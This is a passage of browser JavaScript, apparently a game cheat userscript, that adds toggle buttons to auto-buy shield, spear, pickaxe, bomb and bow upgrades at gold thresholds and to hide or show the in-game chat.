        rc.tokensElem.innerHTML = Math.round(pt.token).toLocaleString("en");
    };
}
let sipt = setInterval(() => {
    game.ui.addListener('playerTickUpdate', fullRSS);
}, 50);
setTimeout(() => { clearInterval(sipt); }, 50);

let V_AutoBuyShield = false;
document.getElementsByClassName("41i6")[0].addEventListener('click', function () {
    V_AutoBuyShield = !V_AutoBuyShield;
    document.getElementsByClassName("41i6")[0].innerText = "Enable Auto Buy Shield";
    if (V_AutoBuyShield) {
        document.getElementsByClassName("41i6")[0].innerText = "Disable Auto Buy Shield";
    }
})
game.network.addEntityUpdateHandler(() => {
    if (V_AutoBuyShield) {
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 1 && game.ui.playerTick.gold >= 1000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 2 && game.ui.playerTick.gold >= 3000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 3 && game.ui.playerTick.gold >= 7000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 4 && game.ui.playerTick.gold >= 14000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 5 && game.ui.playerTick.gold >= 18000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 6 && game.ui.playerTick.gold >= 22000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 7 && game.ui.playerTick.gold >= 24000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 8 && game.ui.playerTick.gold >= 30000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 9 && game.ui.playerTick.gold >= 45000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.ZombieShield.nextTier === 10 && game.ui.playerTick.gold >= 70000) {
            game.ui.components.MenuShop.shopItems.ZombieShield.componentElem.click();
        }
    }
})

let V_AutoBuySpear = false;
document.getElementsByClassName("37i6")[0].addEventListener('click', function () {
    V_AutoBuySpear = !V_AutoBuySpear;
    document.getElementsByClassName("37i6")[0].innerText = "Enable Auto Buy Spear";
    if (V_AutoBuySpear) {
        document.getElementsByClassName("37i6")[0].innerText = "Disable Auto Buy Spear";
    }
})
game.network.addEntityUpdateHandler(() => {
    if (V_AutoBuySpear) {
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 1 && game.ui.playerTick.gold >= 1400) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 2 && game.ui.playerTick.gold >= 2800) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 3 && game.ui.playerTick.gold >= 5600) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 4 && game.ui.playerTick.gold >= 11200) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 5 && game.ui.playerTick.gold >= 22500) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 6 && game.ui.playerTick.gold >= 45000) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Spear.nextTier === 7 && game.ui.playerTick.gold >= 90000) {
            game.ui.components.MenuShop.shopItems.Spear.componentElem.click();
        }
    }
})
let V_AutoBuyPickaxe = false;
document.getElementsByClassName("38i6")[0].addEventListener('click', function () {
    V_AutoBuyPickaxe = !V_AutoBuyPickaxe;
    document.getElementsByClassName("38i6")[0].innerText = "Enable Auto Buy Pickaxe";
    if (V_AutoBuyPickaxe) {
        document.getElementsByClassName("38i6")[0].innerText = "Disable Auto Buy Pickaxe";
    }
})

game.network.addEntityUpdateHandler(() => {
    if (V_AutoBuyPickaxe) {
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 1 && game.ui.playerTick.gold >= undefined) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 2 && game.ui.playerTick.gold >= 1000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 3 && game.ui.playerTick.gold >= 3000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 4 && game.ui.playerTick.gold >= 5000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 5 && game.ui.playerTick.gold >= 8000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 6 && game.ui.playerTick.gold >= 24000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Pickaxe.nextTier === 7 && game.ui.playerTick.gold >= 90000) {
            game.ui.components.MenuShop.shopItems.Pickaxe.componentElem.click();
        }
    }
});
let V_AutoBuyBomb = false;
document.getElementsByClassName("39i6")[0].addEventListener('click', function () {
    V_AutoBuyBomb = !V_AutoBuyBomb;
    document.getElementsByClassName("39i6")[0].innerText = "Enable Auto Buy Bomb";
    if (V_AutoBuyBomb) {
        document.getElementsByClassName("39i6")[0].innerText = "Disable Auto Buy Bomb";
    }
})
game.network.addEntityUpdateHandler(() => {
    if (V_AutoBuyBomb) {
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 1 && game.ui.playerTick.gold >= 100) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 2 && game.ui.playerTick.gold >= 400) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 3 && game.ui.playerTick.gold >= 3000) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 4 && game.ui.playerTick.gold >= 5000) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 5 && game.ui.playerTick.gold >= 24000) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 6 && game.ui.playerTick.gold >= 50000) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bomb.nextTier === 7 && game.ui.playerTick.gold >= 90000) {
            game.ui.components.MenuShop.shopItems.Bomb.componentElem.click();
        }
    }
})
let V_AutoBuyBow = false;
document.getElementsByClassName("40i6")[0].addEventListener('click', function () {
    V_AutoBuyBow = !V_AutoBuyBow;
    document.getElementsByClassName("40i6")[0].innerText = "Enable Auto Buy Bow";
    if (V_AutoBuyBow) {
        document.getElementsByClassName("40i6")[0].innerText = "Disable Auto Buy Bow";
    }
})
game.network.addEntityUpdateHandler(() => {
    if (V_AutoBuyBow) {
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 1 && game.ui.playerTick.gold >= 100) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 2 && game.ui.playerTick.gold >= 400) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 3 && game.ui.playerTick.gold >= 2000) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 4 && game.ui.playerTick.gold >= 7000) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 5 && game.ui.playerTick.gold >= 24000) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 6 && game.ui.playerTick.gold >= 30000) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
        if (game.ui.components.MenuShop.shopItems.Bow.nextTier === 7 && game.ui.playerTick.gold >= 90000) {
            game.ui.components.MenuShop.shopItems.Bow.componentElem.click();
        }
    }
})

document.getElementsByClassName("42i6")[0].addEventListener('click', function () {
    window.togglechat = !window.togglechat;
    document.getElementsByClassName("42i6")[0].innerText = "Hide Chat";
    document.getElementsByClassName("hud-chat")[0].style.display = "block";
    if (window.togglechat) {
        document.getElementsByClassName("42i6")[0].innerText = "Show Chat";
        document.getElementsByClassName("hud-chat")[0].style.display = "none";
    }
})